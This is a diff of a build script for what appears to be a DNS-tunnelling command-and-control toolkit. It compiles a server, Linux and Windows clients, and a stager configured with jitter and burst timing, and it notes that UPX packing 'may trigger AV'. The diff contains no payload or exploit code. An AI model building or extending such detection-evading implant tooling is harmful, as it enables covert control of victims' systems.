@@ -29,33 +29,81 @@ BUILDFLAGS="-trimpath"
 # Create build directory
 mkdir -p build/production
 
-echo -e "${YELLOW}[1/5] Building Server (Linux)...${NC}"
+# Check if build_config.json exists
+if [ ! -f "build_config.json" ]; then
+    echo -e "${RED}Error: build_config.json not found${NC}"
+    exit 1
+fi
+
+echo -e "${YELLOW}[1/5] Embedding configuration from build_config.json...${NC}"
+# Build and run the builder tool to embed config
+cd tools/builder
+go build -o ../../build-tool .
+cd ../..
+
+echo "  Running builder tool to embed configuration..."
+./build-tool
+
+# Clean up build-tool
+rm -f build-tool build-tool.exe
+echo -e "${GREEN}✓ Configuration embedded into source files${NC}"
+echo ""
+
+echo -e "${YELLOW}[2/5] Building Server (Linux) with optimizations...${NC}"
 cd Server
 GOOS=linux GOARCH=amd64 go build ${BUILDFLAGS} -ldflags="${LDFLAGS}" -o ../build/production/dns-server-linux .
 echo -e "${GREEN}✓ Server built: $(du -h ../build/production/dns-server-linux | cut -f1)${NC}"
 cd ..
 
-echo -e "${YELLOW}[2/5] Building Client (Linux)...${NC}"
+echo -e "${YELLOW}[3/5] Building Client (Linux)...${NC}"
 cd Client
 GOOS=linux GOARCH=amd64 go build ${BUILDFLAGS} -ldflags="${LDFLAGS}" -o ../build/production/dns-client-linux .
 echo -e "${GREEN}✓ Linux client built: $(du -h ../build/production/dns-client-linux | cut -f1)${NC}"
 cd ..
 
-echo -e "${YELLOW}[3/5] Building Client (Windows)...${NC}"
+echo -e "${YELLOW}[4/5] Building Client (Windows)...${NC}"
 cd Client
 GOOS=windows GOARCH=amd64 go build ${BUILDFLAGS} -ldflags="${LDFLAGS}" -o ../build/production/dns-client-windows.exe .
 echo -e "${GREEN}✓ Windows client built: $(du -h ../build/production/dns-client-windows.exe | cut -f1)${NC}"
 cd ..
 
-echo -e "${YELLOW}[4/5] Building Stager (Linux)...${NC}"
+echo -e "${YELLOW}[5/5] Building Stager (Linux) with jitter config...${NC}"
+# Show stager config being used
+if command -v jq &> /dev/null && [ -f "build_config.json" ]; then
+    STAGER_JITTER_MIN=$(jq -r '.stager.jitter_min_ms // 100' build_config.json)
+    STAGER_JITTER_MAX=$(jq -r '.stager.jitter_max_ms // 500' build_config.json)
+    STAGER_CHUNKS=$(jq -r '.stager.chunks_per_burst // 10' build_config.json)
+    STAGER_BURST=$(jq -r '.stager.burst_pause_ms // 2000' build_config.json)
+    echo "  Expected Config: ${STAGER_JITTER_MIN}-${STAGER_JITTER_MAX}ms jitter, ${STAGER_CHUNKS} chunks/burst, ${STAGER_BURST}ms burst pause"
+    echo ""
+fi
+
 cd Stager
 make clean > /dev/null 2>&1 || true
-make CFLAGS="-O3 -s -DDEBUG_MODE=0" > /dev/null
-cp stager-linux-x64 ../build/production/
-echo -e "${GREEN}✓ Stager built: $(du -h ../build/production/stager-linux-x64 | cut -f1)${NC}"
+
+# Build stager using build.sh (production mode - no debug)
+# Do NOT suppress output so we can see what config is being compiled
+echo "  Building stager from config..."
+if bash build.sh; then
+    # Copy from build directory (where build.sh puts it)
+    if [ -f "../build/stager/stager-linux-x64" ]; then
+        cp ../build/stager/stager-linux-x64 ../build/production/
+        echo -e "${GREEN}✓ Stager built: $(du -h ../build/production/stager-linux-x64 | cut -f1)${NC}"
+    else
+        echo -e "${RED}✗ Stager binary not found at expected location${NC}"
+        cd ..
+        exit 1
+    fi
+else
+    echo -e "${RED}✗ Stager build failed${NC}"
+    cd ..
+    exit 1
+fi
 cd ..
 
-echo -e "${YELLOW}[5/5] Optional: UPX Compression...${NC}"
+echo ""
+echo -e "${GREEN}================================${NC}"
+echo -e "${GREEN}Optional: UPX Compression${NC}"
 if command -v upx &> /dev/null; then
     read -p "Apply UPX compression? (reduces size but may trigger AV) [y/N]: " -n 1 -r
     echo
@@ -81,6 +129,28 @@ echo "Build artifacts in: build/production/"
 echo ""
 ls -lh build/production/
 echo ""
+
+# Show compiled configuration summary
+if command -v jq &> /dev/null && [ -f "build_config.json" ]; then
+    echo -e "${YELLOW}COMPILED CONFIGURATION SUMMARY:${NC}"
+    echo "────────────────────────────────────────"
+    echo "Server:"
+    jq -r '.server | "  Domain: \(.domain)\n  Bind: \(.bind_addr):\(.bind_port)\n  NS1: \(.ns1)\n  NS2: \(.ns2)"' build_config.json
+    echo ""
+    echo "Stager Timing:"
+    STAGER_MIN=$(jq -r '.stager.jitter_min_ms' build_config.json)
+    STAGER_MAX=$(jq -r '.stager.jitter_max_ms' build_config.json)
+    STAGER_CHUNKS=$(jq -r '.stager.chunks_per_burst' build_config.json)
+    STAGER_BURST=$(jq -r '.stager.burst_pause_ms' build_config.json)
+    echo "  Jitter: ${STAGER_MIN}-${STAGER_MAX}ms ($(echo "scale=1; $STAGER_MIN/1000" | bc)-$(echo "scale=1; $STAGER_MAX/1000" | bc)s)"
+    echo "  Burst: ${STAGER_CHUNKS} chunks per burst"
+    echo "  Pause: ${STAGER_BURST}ms ($(echo "scale=1; $STAGER_BURST/1000" | bc)s) between bursts"
+    TOTAL_MIN=$((STAGER_MIN + STAGER_BURST))
+    TOTAL_MAX=$((STAGER_MAX + STAGER_BURST))
+    echo "  Total delay between bursts: $(echo "scale=1; $TOTAL_MIN/1000" | bc)-$(echo "scale=1; $TOTAL_MAX/1000" | bc)s"
+    echo ""
+fi
+
 echo -e "${YELLOW}⚠️  DEPLOYMENT CHECKLIST:${NC}"
 echo "  [ ] Change encryption key (server config.json + client build_config.json)"
 echo "  [ ] Configure domain and NS records"
